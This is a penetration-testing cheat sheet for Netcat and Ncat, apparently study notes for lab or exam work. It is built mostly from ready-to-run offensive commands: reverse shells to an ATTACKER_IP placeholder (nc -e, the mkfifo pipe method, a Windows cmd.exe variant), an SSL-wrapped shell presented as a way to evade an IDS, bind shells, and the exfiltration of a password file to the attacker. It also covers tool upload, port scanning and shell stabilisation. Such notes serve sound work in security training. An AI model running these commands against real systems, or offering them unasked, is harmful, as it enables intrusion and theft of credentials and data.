# Netcat (The Swiss Army Knife)
**Concept:** A versatile CLI tool for reading/writing to network connections. **Key Roles:**
1. **Listener:** Catching incoming reverse shells.
2. **Client:** Connecting to bind shells.
3. **Transfer:** Moving files when SSH/SCP is unavailable.
4. **Scanner:** Quick port identification.
## 1. Listeners & Basic Connection
**The Listener (Server):** This is your "catcher's mitt". You open a port on your machine and wait for the victim to connect to you.
- `-l`: Listen mode.
- `-v`: Verbose (show connection status).
- `-n`: Numeric only (no DNS resolution - faster).
- `-p`: Port number.
- `-u`: UDP mode (optional).

```shell
# TCP Listener (Standard)
sudo nc -lvnp 4444

# UDP Listener
sudo nc -u -lvnp 4444
```

**The Client (Connection):** Connecting to a remote port (like Telnet, but raw).
```shell
# Connect to a target
nc -nv <TARGET_IP> <PORT>
```
## 2. Reverse & Bind Shells
**Crucial Distinction:**
- **Reverse Shell:** Victim connects _out_ to Attacker. (Bypasses inbound firewalls). **Preferred.**
- **Bind Shell:** Victim opens a port and waits for Attacker to connect _in_. (Blocked by most firewalls).
### Reverse Shells (Victim -> Attacker)
**1. Attacker (Listen):**
```shell
sudo nc -lvnp 4444
```

**2. Victim (Execute):**
```shell
# Linux (Traditional - often disabled)
nc -e /bin/bash <ATTACKER_IP> 4444

# Linux (Modern OpenBSD Netcat - The "Pipe" Method)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f

# Windows
nc.exe -e cmd.exe <ATTACKER_IP> 4444
```
### Bind Shells (Attacker -> Victim)
**1. Victim (Listen):**
```shell
nc -lvnp 4444 -e /bin/bash
```

**2. Attacker (Connect):**
```shell
nc -nv <VICTIM_IP> 4444
```
## 3. File Transfer
**Scenario:** You have a shell but no SSH/SCP. You need to exfiltrate a database dump or upload an exploit script.
### Grab a File (Exfiltration)
**Direction:** Victim -> Attacker.

**1. Attacker (Receiver) - Start first!**
```shell
# Listen and direct output to a file
nc -lvnp 4444 > extracted_passwords.txt
```

**2. Victim (Sender):**
```shell
# Connect and pipe file content into the socket
nc -nv <ATTACKER_IP> 4444 < passwords.txt
```
### Upload a Tool
**Direction:** Attacker -> Victim.

**1. Victim (Receiver) - Start first!**
```shell
# Listen and write incoming data to a file
nc -lvnp 4444 > linpeas.sh
```

**2. Attacker (Sender):**
```shell
# Connect and pipe local file into the socket
nc -nv <VICTIM_IP> 4444 < linpeas.sh
```
## 4. Ncat (Nmap's Netcat)
**Context:** `ncat` is the modern, improved version included with Nmap. It supports **SSL encryption**, making your shell traffic look like HTTPS to an IDS.
```shell
# Encrypted Listener (Attacker)
ncat --ssl -lvnp 4444

# Encrypted Connection (Victim)
ncat --ssl -e /bin/bash <ATTACKER_IP> 4444
```

**Access Control:**
```shell
# Allow only a specific IP to connect (Good for Bind Shells)
ncat -lvnp 4444 --allow 192.168.1.50 -e /bin/bash
```
## 5. Port Scanning (Banner Grabbing)
**Use Case:** Quick check if a port is open without launching a full Nmap scan.
```shell
# Scan a single port
# -z: Zero-I/O (Scan mode)
nc -nv -z <TARGET_IP> 80

# Scan a range (Fast)
# -w 1: Wait max 1 second per port
nc -nv -z -w 1 <TARGET_IP> 1-1000

# Banner Grabbing (Send empty packet to provoke a response)
echo "" | nc -nv -w 1 <TARGET_IP> 22
```
## 6. Shell Stabilization (The Magic Sequence)
**Problem:** Netcat shells are "dumb". If you press `Ctrl+C`, the connection dies. You can't use `vim` or `su`. **Solution:** Upgrade to a full PTY.

**Step 1: Spawn Python PTY (Inside the NC shell)**
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Step 2: Background (Press keys)** `Ctrl + Z`

**Step 3: Fix Local Terminal (In Kali)**
```shell
# Pass raw keycodes through
stty raw -echo; fg
# (Press Enter twice if prompt doesn't appear immediately)
```

**Step 4: Finalize (Inside the NC shell)**
```shell
export TERM=xterm
# Optional: Fix size
stty rows 38 columns 116
```